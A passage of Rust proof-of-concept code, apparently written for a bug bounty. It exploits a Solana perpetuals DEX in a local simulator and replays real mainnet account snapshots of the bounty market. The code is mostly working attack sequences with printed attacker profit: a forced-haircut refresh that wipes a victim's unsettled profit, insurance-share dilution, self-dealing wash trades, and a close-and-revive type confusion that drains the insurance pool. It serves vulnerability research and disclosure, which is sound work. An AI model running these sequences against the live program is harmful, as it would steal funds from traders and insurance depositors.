    trade_open(&mut e, mkt, &victim, &bob, 1 * POS_SCALE);
    trade_open(&mut e, mkt, &att_l, &att_s, 1 * POS_SCALE);
    set_slot(&mut e.svm, 101);
    oracle(&mut e, mkt, &o, 104 * POS_SCALE); // +4% (inside the 4% clamp)
    if attack {
        // Third party refreshes the WINNER first with forceHaircut=1 while R_m == 0 (losers unsettled)
        refresh(&mut e, mkt, victim.pfl, true);
        println!("    after forced refresh: victim posPnl={} totalPosPnl={} realizedPool={}",
            read_u64(&e.svm, &victim.pfl, LEG0_POSPNL), read_u64(&e.svm, &mkt, M_TOTPNL), read_u64(&e.svm, &mkt, M_REALIZED));
    }
    refresh(&mut e, mkt, bob.pfl, false);
    refresh(&mut e, mkt, att_s.pfl, false);
    refresh(&mut e, mkt, att_l.pfl, false);
    refresh(&mut e, mkt, victim.pfl, false);
    (cap(&e, &victim), cap(&e, &att_l), read_u64(&e.svm, &mkt, M_REALIZED))
}

/// Builds a market whose insurance is fully drained by a bad-debt liquidation. Returns env, mkt, lp1 receipt etc.
fn drain_insurance(elf: &[u8], frontrun_refresh: bool) -> (Env, Address, User, Address, User, User) {
    let mut e = setup(elf);
    let o = Keypair::new(); e.svm.airdrop(&o.pubkey(), 1_000_000_000).unwrap();
    let creator = user(&mut e, 0);
    let mkt = market(&mut e, &creator, &o, 10_000); // creator chose maxInsDrawBps = 100%
    let lp1 = user(&mut e, 0);
    let rcpt1 = create_prog_acc(&mut e.svm, &e.prog, INS_SIZE);
    send_ok(&mut e.svm, ix_deposit_insurance(e.prog, e.dex, mkt, rcpt1, lp1.kp.pubkey(), lp1.tok, e.mint, e.vault, TOKEN_PROGRAM_ID, 100 * POS_SCALE), &e.payer, &[&e.payer, &lp1.kp]);
    let trader = user(&mut e, 100 * POS_SCALE);       // long 10 units @100 (IM = 100)
    let cp     = user(&mut e, 10_000 * POS_SCALE);    // short counterparty
    trade_open(&mut e, mkt, &trader, &cp, 10 * POS_SCALE);
    // price gaps down 4%/slot for 10 slots with nobody refreshing the trader (keeper outage / congestion)
    let mut p = 100 * POS_SCALE;
    for i in 0..10u64 { set_slot(&mut e.svm, 101 + i); p = p - p * 4 / 100; oracle(&mut e, mkt, &o, p); }
    let keeper_tok = create_tok_acc(&mut e.svm, &e.mint, &e.payer.pubkey(), 0);
    if frontrun_refresh {
        refresh(&mut e, mkt, trader.pfl, false); // anyone settles the loss first; shortfall is discarded
    }
    send_ok(&mut e.svm, ix_liquidate_ext(e.prog, e.dex, mkt, trader.pfl, keeper_tok, e.mint, e.vault, TOKEN_PROGRAM_ID, 0, 0, None), &e.payer, &[&e.payer]);
    (e, mkt, lp1, rcpt1, trader, cp)
}

/// PoC 1b: same attack, attacker is (only) insurance LP -> stranded profit is swept to insurance at resolution and withdrawn.
fn poc_force_haircut_capture(elf: &[u8], attack: bool) -> (u64, u64) {
    let mut e = setup(elf);
    let o = Keypair::new(); e.svm.airdrop(&o.pubkey(), 1_000_000_000).unwrap();
    let creator = user(&mut e, 0);
    let mkt = market(&mut e, &creator, &o, 2500);
    let att = user(&mut e, 0);
    let rc = create_prog_acc(&mut e.svm, &e.prog, INS_SIZE);
    send_ok(&mut e.svm, ix_deposit_insurance(e.prog, e.dex, mkt, rc, att.kp.pubkey(), att.tok, e.mint, e.vault, TOKEN_PROGRAM_ID, 1 * POS_SCALE), &e.payer, &[&e.payer, &att.kp]);
    let victim = user(&mut e, 1_000 * POS_SCALE);
    let bob    = user(&mut e, 1_000 * POS_SCALE);
    trade_open(&mut e, mkt, &victim, &bob, 10 * POS_SCALE);
    set_slot(&mut e.svm, 101);
    oracle(&mut e, mkt, &o, 104 * POS_SCALE);
    if attack { refresh(&mut e, mkt, victim.pfl, true); }
    refresh(&mut e, mkt, bob.pfl, false);
    refresh(&mut e, mkt, victim.pfl, false);
    // oracle goes stale -> permissionless wind-down by the attacker (not admin), exit window, force close, resolve
    set_slot(&mut e.svm, 160);
    send_ok(&mut e.svm, ix_start_wind_down(e.prog, mkt, att.kp.pubkey()), &e.payer, &[&e.payer, &att.kp]);
    set_slot(&mut e.svm, 190);
    send_ok(&mut e.svm, ix_force_close_pair(e.prog, e.dex, mkt, victim.pfl, bob.pfl), &e.payer, &[&e.payer]);
    send_ok(&mut e.svm, ix_resolve_market(e.prog, e.dex, mkt), &e.payer, &[&e.payer]);
    let sh = read_u64(&e.svm, &rc, 80);
    let b = token_amount(&e.svm, &att.tok);
    send_ok(&mut e.svm, ix_withdraw_insurance(e.prog, e.dex, mkt, rc, att.kp.pubkey(), att.tok, e.mint, e.vault, TOKEN_PROGRAM_ID, sh), &e.payer, &[&e.payer, &att.kp]);
    (cap(&e, &victim), token_amount(&e.svm, &att.tok) - b)
}

/// LEAD-004: two markets on ONE dex/vault. Prove an attacker market cannot reach market A's insurance.
fn lead004_isolation(elf: &[u8]) {
    let mut e = setup(elf);
    let oa = Keypair::new(); e.svm.airdrop(&oa.pubkey(), 1_000_000_000).unwrap();
    let ob = Keypair::new(); e.svm.airdrop(&ob.pubkey(), 1_000_000_000).unwrap();
    let house = user(&mut e, 0);
    let attacker = user(&mut e, 0);
    // Market A = the "prize" market: maxInsDrawBps = 2500 (like live 76oGDQ), house funds 70 insurance.
    let mkt_a = market(&mut e, &house, &oa, 2500);
    let rc_house = create_prog_acc(&mut e.svm, &e.prog, INS_SIZE);
    send_ok(&mut e.svm, ix_deposit_insurance(e.prog, e.dex, mkt_a, rc_house, house.kp.pubkey(), house.tok, e.mint, e.vault, TOKEN_PROGRAM_ID, 70 * POS_SCALE), &e.payer, &[&e.payer, &house.kp]);
    // Market B = attacker-created on the SAME dex, maxInsDrawBps = 10000 (full I-draw allowed).
    let mkt_b = market(&mut e, &attacker, &ob, 10_000);

    let a_ins0 = read_u64(&e.svm, &mkt_a, M_INS);
    let vault0 = token_amount(&e.svm, &e.vault);
    let dex_ins0 = read_u64(&e.svm, &e.dex, 176);
    println!("  start: marketA.insurance={} vault(SPL)={} dex.totalInsurance={}", usd(a_ins0), usd(vault0), usd(dex_ins0));

    // (a) Can the attacker's receipt on market B be used to withdraw against market A's insurance?
    let rc_b = create_prog_acc(&mut e.svm, &e.prog, INS_SIZE);
    send_ok(&mut e.svm, ix_deposit_insurance(e.prog, e.dex, mkt_b, rc_b, attacker.kp.pubkey(), attacker.tok, e.mint, e.vault, TOKEN_PROGRAM_ID, 1 * POS_SCALE), &e.payer, &[&e.payer, &attacker.kp]);
    let cross = send_ixs_try(&mut e.svm, &[ix_withdraw_insurance(e.prog, e.dex, mkt_a, rc_b, attacker.kp.pubkey(), attacker.tok, e.mint, e.vault, TOKEN_PROGRAM_ID, 1)], &e.payer, &[&e.payer, &attacker.kp]);
    println!("  (a) withdraw marketB receipt AGAINST marketA: {}", match cross { Ok(_) => "!!! SUCCEEDED (break)".into(), Err(ref x) => format!("rejected ({})", x.lines().next().unwrap_or("")) });

    // (b) Run lead-2 share-reset dilution ON market B (maxInsDraw 10000) and confirm market A untouched.
    let lp1 = user(&mut e, 0);
    let rc1 = create_prog_acc(&mut e.svm, &e.prog, INS_SIZE);
    send_ok(&mut e.svm, ix_deposit_insurance(e.prog, e.dex, mkt_b, rc1, lp1.kp.pubkey(), lp1.tok, e.mint, e.vault, TOKEN_PROGRAM_ID, 100 * POS_SCALE), &e.payer, &[&e.payer, &lp1.kp]);
    let trader = user(&mut e, 100 * POS_SCALE);
    let cp = user(&mut e, 10_000 * POS_SCALE);
    trade_open(&mut e, mkt_b, &trader, &cp, 10 * POS_SCALE);
    let mut p = 100 * POS_SCALE;
    for i in 0..10u64 { set_slot(&mut e.svm, 101 + i); p = p - p * 4 / 100; oracle(&mut e, mkt_b, &ob, p); }
    let ktok = create_tok_acc(&mut e.svm, &e.mint, &e.payer.pubkey(), 0);
    send_ok(&mut e.svm, ix_liquidate_ext(e.prog, e.dex, mkt_b, trader.pfl, ktok, e.mint, e.vault, TOKEN_PROGRAM_ID, 0, 0, None), &e.payer, &[&e.payer]);
    println!("  (b) after draining marketB.insurance -> {} (shares still {})", usd(read_u64(&e.svm, &mkt_b, M_INS)), read_u64(&e.svm, &mkt_b, M_TOTSH));

    let a_ins1 = read_u64(&e.svm, &mkt_a, M_INS);
    println!("  RESULT: marketA.insurance {} -> {}  (delta {})", usd(a_ins0), usd(a_ins1), usd(a_ins0.saturating_sub(a_ins1)));
    assert_eq!(a_ins0, a_ins1, "market A insurance changed!");

    // (c) Attacker tries to over-withdraw market B beyond its own (now-zero) insurance to reach shared vault.
    let over = send_ixs_try(&mut e.svm, &[ix_withdraw_insurance(e.prog, e.dex, mkt_b, rc_b, attacker.kp.pubkey(), attacker.tok, e.mint, e.vault, TOKEN_PROGRAM_ID, 1)], &e.payer, &[&e.payer, &attacker.kp]);
    // mkt_b has oiShort>0 still (dead cp leg) so withdraw is also OI-gated:
    println!("  (c) attacker withdraw marketB (ins now 0): {}", match over { Ok(_) => "ok(paid 0)".into(), Err(ref x)=> format!("rejected ({})", x.lines().next().unwrap_or("")) });

    // (d) Confirm no instruction can extract dex.totalSurplus (global rounding sink). There is no WithdrawSurplus op.
    println!("  (d) dex.totalSurplus={} (no handler can withdraw it; sweeps strand value, not extract)", usd(read_u64(&e.svm, &e.dex, 192)));
}

/// (c) Live-bounty-mirror: house holds the pre-seeded 70e6 insurance shares (like 76oGDQ),
/// maxInsDrawBps=2500, OI=0. Attacker (two keypairs = one entity) runs the strongest self-deal:
/// deposit insurance, wash long/short, forceHaircut-burn own winner, stale wind-down, force-close,
/// resolve, withdraw everything. Net attacker P&L = total attacker USDC end - start.
fn live_bounty_selfdeal(elf: &[u8], attacker_ins_deposit: u64) {
    let mut e = setup(elf);
    let o = Keypair::new(); e.svm.airdrop(&o.pubkey(), 1_000_000_000).unwrap();
    let house = user(&mut e, 0);
    let mkt = market(&mut e, &house, &o, 2500);
    let rc_house = create_prog_acc(&mut e.svm, &e.prog, INS_SIZE);
    send_ok(&mut e.svm, ix_deposit_insurance(e.prog, e.dex, mkt, rc_house, house.kp.pubkey(), house.tok, e.mint, e.vault, TOKEN_PROGRAM_ID, 70 * POS_SCALE), &e.payer, &[&e.payer, &house.kp]);

    let al = user(&mut e, 1_000 * POS_SCALE); // attacker long
    let as_ = user(&mut e, 1_000 * POS_SCALE); // attacker short (same entity)
    let start = token_amount(&e.svm, &al.tok) + token_amount(&e.svm, &as_.tok);
    let rc_atk = create_prog_acc(&mut e.svm, &e.prog, INS_SIZE);
    if attacker_ins_deposit > 0 {
        send_ok(&mut e.svm, ix_deposit_insurance(e.prog, e.dex, mkt, rc_atk, al.kp.pubkey(), al.tok, e.mint, e.vault, TOKEN_PROGRAM_ID, attacker_ins_deposit), &e.payer, &[&e.payer, &al.kp]);
    }
    trade_open(&mut e, mkt, &al, &as_, 10 * POS_SCALE);
    set_slot(&mut e.svm, 101);
    oracle(&mut e, mkt, &o, 104 * POS_SCALE);
    refresh(&mut e, mkt, al.pfl, true);   // burn attacker-long's own profit -> stranded into R_m
    refresh(&mut e, mkt, as_.pfl, false); // settle loser
    refresh(&mut e, mkt, al.pfl, false);
    set_slot(&mut e.svm, 101 + 9001);
    let _ = send_ixs_try(&mut e.svm, &[ix_start_wind_down(e.prog, mkt, al.kp.pubkey())], &e.payer, &[&e.payer, &al.kp]);
    set_slot(&mut e.svm, 101 + 9001 + 11);
    let _ = send_ixs_try(&mut e.svm, &[ix_force_close_pair(e.prog, e.dex, mkt, al.pfl, as_.pfl)], &e.payer, &[&e.payer]);
    let _ = send_ixs_try(&mut e.svm, &[ix_resolve_market(e.prog, e.dex, mkt)], &e.payer, &[&e.payer]);
    let _ = send_ixs_try(&mut e.svm, &[ix_claim_resolved(e.prog, e.dex, mkt, al.pfl)], &e.payer, &[&e.payer]);
    let _ = send_ixs_try(&mut e.svm, &[ix_claim_resolved(e.prog, e.dex, mkt, as_.pfl)], &e.payer, &[&e.payer]);
    let sh = read_u64(&e.svm, &rc_atk, 80);
    if sh > 0 {
        let _ = send_ixs_try(&mut e.svm, &[ix_withdraw_insurance(e.prog, e.dex, mkt, rc_atk, al.kp.pubkey(), al.tok, e.mint, e.vault, TOKEN_PROGRAM_ID, sh)], &e.payer, &[&e.payer, &al.kp]);
    }
    for u in [&al, &as_] {
        let c = read_u64(&e.svm, &u.pfl, P_CAP);
        if c > 0 { let _ = send_ixs_try(&mut e.svm, &[ix_withdraw_collateral(e.prog, e.dex, u.pfl, u.kp.pubkey(), u.tok, e.mint, e.vault, TOKEN_PROGRAM_ID, c)], &e.payer, &[&e.payer, &u.kp]); }
    }
    let end = token_amount(&e.svm, &al.tok) + token_amount(&e.svm, &as_.tok);
    println!("  attacker insurance deposit = {}", usd(attacker_ins_deposit));
    println!("  attacker total USDC: start {} end {}", usd(start), usd(end));
    if end >= start { println!("  NET ATTACKER P&L = +{}  <-- WIN", usd(end - start)); }
    else { println!("  NET ATTACKER P&L = -{}  (loss; house captured stranded value)", usd(start - end)); }
    println!("  shared vault(SPL) {} ; market I_m {} insShares {} ; house still holds its receipt", usd(token_amount(&e.svm, &e.vault)), usd(read_u64(&e.svm, &mkt, M_INS)), read_u64(&e.svm, &mkt, M_TOTSH));
}

fn load_dump(svm: &mut LiteSVM, key: Address, owner: Address, path: &str, patch: impl Fn(&mut Vec<u8>)) {
    let mut data = std::fs::read(path).unwrap();
    patch(&mut data);
    svm.set_account(key, Account { lamports: 10_000_000, data, owner, executable: false, rent_epoch: 0 }).unwrap();
}

/// LIVE-STATE replay: snapshot the real mainnet bounty accounts into LiteSVM and run the lead-1 drain.
fn live_replay(elf: &[u8], snap: &str) {
    use sha2::{Digest, Sha256};
    let prog = Address::from_str_const("GVV4HCAohuWDTXRHUYLpFECvTUhCUF2qys36vQKtYJsm");
    let dex  = Address::from_str_const("6nxbqVQREBwW2ESc1sJyPaUH9yZ7MgKE53fQh3Fm1CkH");
    let mkt  = Address::from_str_const("76oGDQbQW3MEteg2uQqf31PyTmFZp8ujZTyGu3kfFSwq");
    let vault= Address::from_str_const("8MqHSrm6v6ccJVQunjnLqfBBWoAhVGrqUV4hdSH9F8i9");
    let insr = Address::from_str_const("4pxsDAv31curT4YFUaYRFhFyRSnGY2yrAw4grtc2w5F7");
    let usdc = Address::from_str_const("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v");

    // verify deployed binary hash
    let h = hex::encode(Sha256::digest(&elf[..73224.min(elf.len())]));
    println!("  program sha256(first 73224B) = {}", h);
    assert_eq!(h, "c6dc8329207c8a0f874b4c1ceb1c48a5529d031453b7c1e9ce6f5808bca436d1", "binary hash mismatch!");

    let mut svm = LiteSVM::new();
    svm.add_program(prog, elf).expect("ELF load failed");
    let base_slot = 473_936_117u64 + 100; // just after live lastOracleSlot
    set_slot(&mut svm, base_slot);

    let payer = Keypair::new(); svm.airdrop(&payer.pubkey(), 100_000_000_000).unwrap();
    let mint_auth = Keypair::new(); svm.airdrop(&mint_auth.pubkey(), 10_000_000_000).unwrap();
    let test_oracle = Keypair::new(); svm.airdrop(&test_oracle.pubkey(), 10_000_000_000).unwrap();

    // Real USDC mint substituted with a local mock (6 decimals) so we can fund test actors.
    svm.set_account(usdc, Account { lamports: 10_000_000, data: make_spl_mint(6, 1_000_000_000_000_000, &mint_auth.pubkey()), owner: TOKEN_PROGRAM_ID, executable: false, rent_epoch: 0 }).unwrap();

    // Load the REAL account dumps; only patch the market's oracleAuth (48..80) to a key we can drive,
    // and bump lastOracleSlot so the snapshot isn't already stale. Everything else is live bytes.
    load_dump(&mut svm, dex, prog, &format!("{}/dex.bin", snap), |_|{});
    let toracle = test_oracle.pubkey();
    load_dump(&mut svm, mkt, prog, &format!("{}/mkt.bin", snap), move |d| {
        d[48..80].copy_from_slice(toracle.as_ref());
        d[120..128].copy_from_slice(&base_slot.to_le_bytes());
    });
    load_dump(&mut svm, vault, TOKEN_PROGRAM_ID, &format!("{}/vault.bin", snap), |_|{});
    load_dump(&mut svm, insr, prog, &format!("{}/insr.bin", snap), |_|{});

    // sanity: vault PDA derivation matches the live vault pubkey
    let (derived, bump) = Address::find_program_address(&[b"dvlt", dex.as_ref()], &prog);
    println!("  derived vault PDA = {} (bump {}), live vault = {} -> match={}", derived, bump, vault, derived == vault);

    let mkt_ins0 = read_u64(&svm, &mkt, M_INS);
    let mkt_sh0  = read_u64(&svm, &mkt, M_TOTSH);
    let vault0   = token_amount(&svm, &vault);
    let price0   = read_u64(&svm, &mkt, 112);
    println!("  LIVE START: vault(SPL)={} market.insurance={} totalInsShares={} markPrice={}", usd(vault0), usd(mkt_ins0), mkt_sh0, usd(price0));

    let mkacct = |svm:&mut LiteSVM, owner:&Address, amt:u64| -> Address {
        let a = Keypair::new().pubkey();
        svm.set_account(a, Account{lamports:10_000_000, data: make_spl_token_account(&usdc, owner, amt), owner: TOKEN_PROGRAM_ID, executable:false, rent_epoch:0}).unwrap(); a };
    let mkpfl = |svm:&mut LiteSVM| -> Address { create_prog_acc(svm, &prog, PFL_SIZE) };

    // Test actors
    let victim = Keypair::new(); svm.airdrop(&victim.pubkey(), 1_000_000_000).unwrap();
    let shortk = Keypair::new(); svm.airdrop(&shortk.pubkey(), 1_000_000_000).unwrap();
    let att    = Keypair::new(); svm.airdrop(&att.pubkey(), 1_000_000_000).unwrap();
    let vic_tok = mkacct(&mut svm, &victim.pubkey(), 100_000 * POS_SCALE);
    let sh_tok  = mkacct(&mut svm, &shortk.pubkey(), 100_000 * POS_SCALE);
    let att_tok = mkacct(&mut svm, &att.pubkey(), 100_000 * POS_SCALE);
    let att_tok0 = token_amount(&svm, &att_tok);
    let vic_pfl = mkpfl(&mut svm); let sh_pfl = mkpfl(&mut svm); let att_pfl = mkpfl(&mut svm);
    for (p,o) in [(vic_pfl,&victim),(sh_pfl,&shortk),(att_pfl,&att)] {
        send_ok(&mut svm, ix_init_portfolio(prog, dex, p, o.pubkey()), &payer, &[&payer, o]);
    }
    send_ok(&mut svm, ix_deposit_collateral(prog, dex, vic_pfl, victim.pubkey(), vic_tok, usdc, vault, TOKEN_PROGRAM_ID, 1_000 * POS_SCALE), &payer, &[&payer, &victim]);
    send_ok(&mut svm, ix_deposit_collateral(prog, dex, sh_pfl, shortk.pubkey(), sh_tok, usdc, vault, TOKEN_PROGRAM_ID, 1_000 * POS_SCALE), &payer, &[&payer, &shortk]);

    // Attacker becomes an insurance LP on the LIVE pool with 1 USDC.
    let att_rc = create_prog_acc(&mut svm, &prog, INS_SIZE);
    send_ok(&mut svm, ix_deposit_insurance(prog, dex, mkt, att_rc, att.pubkey(), att_tok, usdc, vault, TOKEN_PROGRAM_ID, 1 * POS_SCALE), &payer, &[&payer, &att]);
    let att_shares = read_u64(&svm, &att_rc, 80);
    println!("  attacker deposits 1 USDC insurance -> shares={} of totalInsShares={}", att_shares, read_u64(&svm, &mkt, M_TOTSH));

    // Victim long 10u vs honest short 10u at the live mark price.
    send_ok(&mut svm, ix_trade(prog, dex, mkt, vic_pfl, victim.pubkey(), sh_pfl, shortk.pubkey(), 0, 10 * POS_SCALE), &payer, &[&payer, &victim, &shortk]);

    // Oracle +4% (inside the 400 bps clamp), one slot later.
    set_slot(&mut svm, base_slot + 1);
    let newp = price0 + price0 * 4 / 100;
    send_ok(&mut svm, ix_update_oracle(prog, mkt, test_oracle.pubkey(), newp, 0, 0), &payer, &[&payer, &test_oracle]);

    // ATTACK: unsigned forceHaircut refresh of the winner BEFORE the loser settles.
    send_ok(&mut svm, ix_refresh_leg(prog, dex, mkt, vic_pfl, true), &payer, &[&payer]);
    println!("  after forced refresh: victim posPnl={} totalPosPnl={} realizedPool={}",
        read_u64(&svm, &vic_pfl, LEG0_POSPNL), read_u64(&svm, &mkt, M_TOTPNL), read_u64(&svm, &mkt, M_REALIZED));
    // settle the honest short (its loss lands in R_m)
    send_ok(&mut svm, ix_refresh_leg(prog, dex, mkt, sh_pfl, false), &payer, &[&payer]);
    let vic_cap = read_u64(&svm, &vic_pfl, P_CAP);
    println!("  victim capital after wipe = {} (was 1000; a healthy market would give ~1040)", usd(vic_cap));
    let stolen = read_u64(&svm, &mkt, M_REALIZED);
    println!("  stranded realizedPool R_m (stolen from victim) = {}", usd(stolen));

    // Close positions so the market can resolve. Reduce the matched pair to 0 OI.
    let _ = send_ixs_try(&mut svm, &[ix_trade(prog, dex, mkt, vic_pfl, victim.pubkey(), sh_pfl, shortk.pubkey(), 1, 10 * POS_SCALE)], &payer, &[&payer, &victim, &shortk]);

    // Permissionless wind-down (oracle goes stale), exit window, resolve -> sweeps stranded R_m into insurance.
    set_slot(&mut svm, base_slot + 1 + 9001);
    let wd = send_ixs_try(&mut svm, &[ix_start_wind_down(prog, mkt, att.pubkey())], &payer, &[&payer, &att]);
    println!("  permissionless StartWindDown by attacker: {:?}", wd.map(|_|"ok"));
    set_slot(&mut svm, base_slot + 1 + 9001 + 20);
    let rm = send_ixs_try(&mut svm, &[ix_resolve_market(prog, dex, mkt)], &payer, &[&payer]);
    println!("  ResolveMarket: {:?}  insurance now={} totalInsShares={} R_m={}", rm.map(|_|"ok"),
        usd(read_u64(&svm, &mkt, M_INS)), read_u64(&svm, &mkt, M_TOTSH), usd(read_u64(&svm, &mkt, M_REALIZED)));

    // Attacker withdraws all its insurance shares.
    let insN = read_u64(&svm, &mkt, M_INS); let shN = read_u64(&svm, &mkt, M_TOTSH);
    let wr = send_ixs_try(&mut svm, &[ix_withdraw_insurance(prog, dex, mkt, att_rc, att.pubkey(), att_tok, usdc, vault, TOKEN_PROGRAM_ID, att_shares)], &payer, &[&payer, &att]);
    let att_net = token_amount(&svm, &att_tok) as i128 - att_tok0 as i128;
    println!("  WithdrawInsurance(attacker, {} shares of {}): {:?}", att_shares, shN, wr.map(|_|"ok"));
    println!();
    println!("  ===== LIVE REPLAY RESULT =====");
    println!("  vault(SPL):        {} -> {}", usd(vault0), usd(token_amount(&svm, &vault)));
    println!("  market.insurance:  {} -> {}", usd(mkt_ins0), usd(read_u64(&svm, &mkt, M_INS)));
    println!("  totalInsShares:    {} -> {}", mkt_sh0, read_u64(&svm, &mkt, M_TOTSH));
    let healthy = 1_000 * POS_SCALE + stolen; println!("  victim net:        {} (healthy would be {}; lost {})", usd(vic_cap), usd(healthy), usd(healthy - vic_cap));
    println!("  attacker net USDC: {}{}", if att_net>=0 {"+"} else {"-"}, usd(att_net.unsigned_abs() as u64));
    println!("  of the ORIGINAL 70 insurance, attacker extracted: {} (deposit was 1.0)", if att_net>0 { usd(att_net as u64) } else { "0 (lost deposit)".into() });
}

fn sys_transfer(from: Address, to: Address, lamports: u64) -> Instruction {
    let mut data = vec![2u8,0,0,0];
    data.extend_from_slice(&lamports.to_le_bytes());
    Instruction { program_id: SYSTEM_PROGRAM_ID, accounts: vec![
        AccountMeta::new(from, true), AccountMeta::new(to, false),
    ], data }
}

/// C-1: close a portfolio (magic-only wipe) then revive it as an insurance receipt in the SAME tx,
/// so the leftover owner-pubkey bytes at offset 80 preload a huge `shares` balance, then withdraw
/// the whole pot. Mirrors the live bounty market (ins=70e6, totInsShares=70e6, OI 0, maxInsDraw 2500).
fn c1_close_revive(elf: &[u8]) {
    let mut e = setup(elf);
    let o = Keypair::new(); e.svm.airdrop(&o.pubkey(), 1_000_000_000).unwrap();
    let house = user(&mut e, 0);
    let mkt = market(&mut e, &house, &o, 2500); // live params, maxInsDrawBps=2500
    let rc_house = create_prog_acc(&mut e.svm, &e.prog, INS_SIZE);
    send_ok(&mut e.svm, ix_deposit_insurance(e.prog, e.dex, mkt, rc_house, house.kp.pubkey(), house.tok, e.mint, e.vault, TOKEN_PROGRAM_ID, 70 * POS_SCALE), &e.payer, &[&e.payer, &house.kp]);
    let tot_sh0 = read_u64(&e.svm, &mkt, M_TOTSH);
    let ins0 = read_u64(&e.svm, &mkt, M_INS);
    println!("  live-mirror: market insurance={} totalInsShares={} oiL={} oiS={}", usd(ins0), tot_sh0, read_u64(&e.svm,&mkt,M_OIL), read_u64(&e.svm,&mkt,M_OIS));

    // Attacker owns portfolio P with owner key K; bytes K[24..32] land on receipt.shares(off 80).
    let k = Keypair::new(); e.svm.airdrop(&k.pubkey(), 10_000_000_000).unwrap();
    let atok = create_tok_acc(&mut e.svm, &e.mint, &k.pubkey(), 100_000 * POS_SCALE);
    let dest_sol = Keypair::new().pubkey(); // plain lamport sink for close
    e.svm.set_account(dest_sol, Account{lamports:1, data:vec![], owner:SYSTEM_PROGRAM_ID, executable:false, rent_epoch:0}).unwrap();
    let p = create_prog_acc(&mut e.svm, &e.prog, PFL_SIZE);
    send_ok(&mut e.svm, ix_init_portfolio(e.prog, e.dex, p, k.pubkey()), &e.payer, &[&e.payer, &k]);
    let preload = read_u64(&e.svm, &p, 80); // owner[24..32] as u64 LE
    let kb = k.pubkey().to_bytes();
    let expect = u64::from_le_bytes(kb[24..32].try_into().unwrap());
    println!("  K owner[24..32] u64 = {} (portfolio byte@80 = {}), > totalInsShares? {}", expect, preload, preload > tot_sh0);

    let start_usdc = token_amount(&e.svm, &atok);

    // TX1 (atomic): close P -> top up P -> deposit insurance(1) reviving P as a receipt
    let topup = sys_transfer(k.pubkey(), p, 20_000_000);
    let close = ix_close_account(e.prog, p, k.pubkey(), dest_sol);
    let dep = ix_deposit_insurance(e.prog, e.dex, mkt, p, k.pubkey(), atok, e.mint, e.vault, TOKEN_PROGRAM_ID, 1);
    let r1 = send_ixs_try(&mut e.svm, &[close, topup, dep], &e.payer, &[&e.payer, &k]);
    match &r1 {
        Ok(cu) => println!("  TX1 [close, topup, deposit(1)] OK ({} CU)", cu),
        Err(x) => { println!("  TX1 BLOCKED: {}", x.lines().next().unwrap_or("")); 
            // try two-tx variant: close+topup, then deposit
            let r1a = send_ixs_try(&mut e.svm, &[ix_close_account(e.prog,p,k.pubkey(),dest_sol), sys_transfer(k.pubkey(),p,20_000_000)], &e.payer, &[&e.payer,&k]);
            println!("  retry close+topup alone: {:?}", r1a.map(|_|"ok"));
            let r1b = send_ixs_try(&mut e.svm, &[ix_deposit_insurance(e.prog,e.dex,mkt,p,k.pubkey(),atok,e.mint,e.vault,TOKEN_PROGRAM_ID,1)], &e.payer, &[&e.payer,&k]);
            println!("  retry deposit after close(2-tx): {}", match r1b { Ok(_)=>"ok".into(), Err(ref y)=>format!("blocked {}", y.lines().next().unwrap_or("")) });
        }
    }
    let sh_after = read_u64(&e.svm, &p, 80);
    let rc_market = read_u64(&e.svm, &p, 8);
    let rc_magic = read_u32(&e.svm, &p, 0);
    println!("  receipt after revive: magic=0x{:x} marketId={} shares@80={} (market.totalInsShares={} insurance={})",
        rc_magic, rc_market, sh_after, read_u64(&e.svm,&mkt,M_TOTSH), usd(read_u64(&e.svm,&mkt,M_INS)));

    // TX2: withdraw the whole pot (burnShares = market.totalInsShares -> payout = insurance)
    let burn = read_u64(&e.svm, &mkt, M_TOTSH);
    let r2 = send_ixs_try(&mut e.svm, &[ix_withdraw_insurance(e.prog, e.dex, mkt, p, k.pubkey(), atok, e.mint, e.vault, TOKEN_PROGRAM_ID, burn)], &e.payer, &[&e.payer, &k]);
    println!("  TX2 withdrawInsurance(burn={}): {}", burn, match &r2 { Ok(_)=>"OK".into(), Err(y)=>format!("blocked {}", y.lines().next().unwrap_or("")) });
    let end_usdc = token_amount(&e.svm, &atok);
    println!("  attacker USDC: start {} end {}", usd(start_usdc), usd(end_usdc));
    if end_usdc >= start_usdc { println!("  NET ATTACKER P&L = +{} USDC  <<< POT DRAINED", usd(end_usdc - start_usdc)); }
    else { println!("  NET ATTACKER P&L = -{} USDC", usd(start_usdc - end_usdc)); }
    println!("  final: vault(SPL)={} market.insurance={} market.totalInsShares={}", usd(token_amount(&e.svm,&e.vault)), usd(read_u64(&e.svm,&mkt,M_INS)), read_u64(&e.svm,&mkt,M_TOTSH));
}

fn main() {
    let so_path = std::env::args().nth(1).unwrap_or_else(|| "../elf/percolator-devnet.so".to_string());
    let elf = std::fs::read(&so_path).unwrap();
    if std::env::args().nth(2).as_deref()==Some("live") {
        println!("=== LIVE-STATE REPLAY (mainnet bounty snapshot, local LiteSVM) ===");
        live_replay(&elf, "/workspace/toly-bounty/snap");
        return;
    }
    println!("Binary: {} ({} bytes)", so_path, elf.len());

    println!("\n=== C-1: close/revive insurance-shares type confusion (mainnet ELF) ===");
    c1_close_revive(&elf);
    println!("\n=== (c) LIVE-BOUNTY MIRROR: self-deal, house holds 70e6 shares, maxInsDraw 2500 ===");
    live_bounty_selfdeal(&elf, 0);
    live_bounty_selfdeal(&elf, 70 * POS_SCALE);
    println!("\n=== LEAD-004: cross-market isolation on a shared vault ===");
    lead004_isolation(&elf);
    println!("\n=== PoC1: permissionless forceHaircut burns unsettled winners' profit ===");
    let (v0, a0, r0) = poc_force_haircut(&elf, false);
    println!("  control : victim cap={} attacker-long cap={} stranded R_m={}", usd(v0), usd(a0), usd(r0));
    let (v1, a1, r1) = poc_force_haircut(&elf, true);
    println!("  attack  : victim cap={} attacker-long cap={} stranded R_m={}", usd(v1), usd(a1), usd(r1));
    println!("  RESULT  : victim lost {} of backed profit; {} left stranded in R_m", usd(v0 - v1), usd(r1));

    let (vc, ac) = poc_force_haircut_capture(&elf, false);
    let (vx, ax) = poc_force_haircut_capture(&elf, true);
    println!("  PoC1b control: victim cap={} attacker insurance withdrawal={} (deposited 1.0)", usd(vc), usd(ac));
    println!("  PoC1b attack : victim cap={} attacker insurance withdrawal={} (deposited 1.0)", usd(vx), usd(ax));
    println!("\n=== PoC2: insurance share dilution when I_m == 0 && totalInsShares > 0 ===");
    let (mut e, mkt, lp1, rcpt1, _trader, cp) = drain_insurance(&elf, false);
    println!("  after bad-debt liquidation: insurance={} totalInsShares={} oiL={} oiS={} rawL={} rawS={}",
